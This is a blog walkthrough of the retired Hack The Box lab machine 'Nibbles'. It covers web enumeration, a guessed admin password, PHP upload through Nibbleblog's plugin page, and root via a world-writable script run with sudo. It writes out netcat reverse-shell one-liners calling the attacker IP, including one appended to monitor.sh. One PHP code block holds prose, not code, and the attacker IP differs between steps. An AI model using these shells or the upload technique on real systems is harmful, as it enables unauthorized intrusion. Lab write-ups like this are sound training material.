---
title: hack the box Nibbles walkthrough 
date: 2023-07-03 00:00:01 +0000
categories: [hack the box, walkthrough]
tags: [hack the box, walkthrough, htb, nibbles, nibbleblog, privilege escalation, world-writable file, sudoers misconfiguration, eJPT]
img_path: /assets/img/posts
---

![nibbles](htb-nibbles-desc.png)
*nibbles*

> In this article we are going to assume the following IP addresses:
>
>Local machine (attacker): 10.0.0.1
>
>Target machine (victim): 10.0.0.2
{: .prompt-info}

As this is a retired machine, this will be a grey-box approach, because we have some information about the target.

Things we know about the target machine:

* OS: **Linux**
* User path: **Web**
* Privilege escalation: **World-writable File / Sudoers Misconfiguration**

From this information we can assume that the target machine will be a GNU/Linux host with a running web server with two attack vectors (a world writable file and a misconfigured sudo).

# Enumeration

We are going to scan the target machine to see if our suspicions are confirmed.

```
$ nmap -P0 -n -sV --open -oA nibbles_inital_scan 10.0.0.2
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

We can see that we were right.
The target machine is a GNU/Linux host (Ubuntu), has a web service running on port 80 (Apache 2.4.18) and, moreover, has a ssh service running on port 22.

## Web footprinting

If we open the target in our browser, shows us a simple `Hello world!` message.
But, if we check the page source code, we can see an interesting comment:

```html
<!-- /nibbleblog/ directory. Nothing interesting here! -->
```

A hidden directory...

If we browse to the /nibbleblog directory we will guess that it is a nibble blog. Apart from this, nothing interesting:

![/nibbles directory](htb-nibbles-nibbles-directory.png)
*/nibles_directory*

## Technologies in use

We can identify the technologies used with `whatweb`:

```
http://10.0.0.2/nibbleblog [301 Moved Permanently] Apache[2.4.18], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], IP[10.0.0.2], RedirectLocation[http://10.0.0.2/nibbleblog/], Title[301 Moved Permanently]
http://10.0.0.2/nibbleblog/ [200 OK] Apache[2.4.18], Cookies[PHPSESSID], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], IP[10.0.0.2], JQuery, MetaGenerator[Nibbleblog], PoweredBy[Nibbleblog], Script, Title[Nibbles - Yum yum]

```

## Directory enumeration

As `/nibbleblog` is hidden, let's see if there are more directories hidden.
For this we are going to use `gobuster`:

```
$ gobuster dir -u http://10.0.0.2/nibbleblog/ --wordlist /usr/share/dirb/wordlists/common.txt
```

```
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.0.0.2/nibbleblog/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/dirb/wordlists/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Timeout:                 10s
===============================================================
XXXX/XX/XX XX:XX:XX Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 304]
/.htaccess            (Status: 403) [Size: 309]
/.htpasswd            (Status: 403) [Size: 309]
/admin                (Status: 301) [Size: 327] [--> http://10.0.0.2/nibbleblog/admin/]
/admin.php            (Status: 200) [Size: 1401]
/content              (Status: 301) [Size: 329] [--> http://10.0.0.2/nibbleblog/content/]
/index.php            (Status: 200) [Size: 2987]
/languages            (Status: 301) [Size: 331] [--> http://10.0.0.2/nibbleblog/languages/]
/plugins              (Status: 301) [Size: 329] [--> http://10.0.0.2/nibbleblog/plugins/]
/README               (Status: 200) [Size: 4628]
/themes               (Status: 301) [Size: 328] [--> http://10.0.0.2/nibbleblog/themes/]

===============================================================
```

### README

If we check the `README`file we can see the nibbles blog version in use

```
====== Nibbleblog ======
Version: v4.0.3
Codename: Coffee
Release date: 2014-04-01
```

If we look for exploits for nibbleblog we can see that there is one arbitrary file inclusion for the version in use:

```
$ searchsploit nibbleblog          
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                             |  Path
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Nibbleblog 3 - Multiple SQL Injections                                                                                                                                     | php/webapps/35865.txt
Nibbleblog 4.0.3 - Arbitrary File Upload (Metasploit)                                                                                                                      | php/remote/38489.rb
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

### admin.php

We can see that there is an `admin.php` page...

![admin.php](htb-nibbles-nibbles-adminphp.png)
*admin.php*

Unfortunately we don't have valid credentials, and the blog has bruteforcing protection.

If we browse the other paths, we can found a `users.xml` file in `/nibleblog/content/private/`.
Here, we can found our valid admin user name:

```xml
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<users>
  <user username="admin">
    <id type="integer">0</id>
    <session_fail_count type="integer">0</session_fail_count>
    <session_date type="integer">1514544131</session_date>
  </user>
  <blacklist type="string" ip="10.10.10.1">
    <date type="integer">1512964659</date>
    <fail_count type="integer">1</fail_count>
  </blacklist>
</users>
```

Now, we have a valid admin user name, but we don't have a password...

### config.xml

In the `/nibbleblog/content/private/` directory we can found another interesting file: `config.xml`.
If we check the `config.xml` file, we will not find any password, but we found three mentions of `nibbles`, one in the notification mail address...

```xml
<name type="string">Nibbles</name>
<notification_email_to type="string">admin@nibbles.com</notification_email_to>
<seo_site_title type="string">Nibbles - Yum yum</seo_site_title>
```

# Foothold

At this point, with the brute force option ruled out, we should have to take a leap of faith.
We will try `nibbles` as the admin account password.

It worked!

![Nibbleblog admin dashboard](htb-nibbles-nibbles-admin-dashboard.png)
*Nibbleblog admin dashboard*

It seems that we can upload files from the section `Plugins`.
So, we can upload a PHP snippet code to verify that we can upload files and if they can be used for code execution.

We create a file `ce_test.php` with the following content:

```php
So, we can upload a PHP snipet code to check the file upload and if can be use to code execution.
```

Leaving aside a bunch of errors, it seems that the file has been uploaded.

The file was uploaded in the `/nibbleblog/content/private/plugins/my_image/`, but renamed to `image.php`.
Let's check if we have command execution:

```
$ curl http://10.0.0.2/nibbleblog/content/private/plugins/my_image/image.php

uid=1001(nibbler) gid=1001(nibbler) groups=1001(nibbler)
```

We have code execution, so we need to obtain a reverse shell. 
In order to do this, we create a file `rs.php` with the following bash one-liner reverse shell:

```php
<?php system ("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f"); ?>
```

We upload it again and we can see that is renamed to `image.php` again.

Now we need to start a netcat listener on our host (the attacker):

```
$ nc -lvnp 1234
```

We need `curl` or browse our `image.php` file to execute the reverse shell.
Now, we have a reverse shell.

The shell we have is not fully interactive, so we will upgrade our shell to a nicer shell.
We will use a python one-liner to spawn a pseudo terminal:

```python
$ python 3 -c 'import pty; pty.spawn("/bin/bash")'
```

Now, what user we are?

```
$ id

uid=1001(nibbler) gid=1001(nibbler) groups=1001(nibbler)
```

We need to check our sudo privileges.
It is something that we should always do, but in this case with more reason, because, if you remember, there's a **sudoers misconfiguration** in this box.

```
$ sudo -l
sudo: unable to resolve host Nibbles: Connection timed out
Matching Defaults entries for nibbler on Nibbles:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User nibbler may run the following commands on Nibbles:
    (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh
```

We can execute `/home/nibbler/personal/stuff/monitor.sh` as root without password.

If we navigate to our home '/home/nibbler` we can see two files:

* `personal.zip`
* `user.txt` (Our first flag)

If we unzip the `personal.zip` file we will find the `monitor.sh` file.

```
$ unzip personal.zip

unzip personal.zip
Archive:  personal.zip
   creating: personal/
   creating: personal/stuff/
  inflating: personal/stuff/monitor.sh 
```

The `monitor.sh` file is a bash script and is world-writable.
This box has a **world-writable file explotation** and we can run this script as root without password.

# Privilege escalation

As `monitor.sh` is world-writable, we can append a reverse shell one-liner to the end of `monitor.sh` file and, when we run it, we will have a reverse shell as root.

We will append a bash one-liner at the end of `monitor.sh`:

```
$ echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.0.1 1235 >/tmp/f' | tee -a monitor.sh
```

We open a new necat listener on our host (attacker):

```
$ nc -lvnp 1235
```

And we execute the `monitor.sh` script as sudo in the target (victim) host:

```
$ sudo /home/nibbler/personal/stuff/monitor.sh
```

Now, we are root and we can get the root flag stored in `/root.txt`

*Enjoy! ;)*
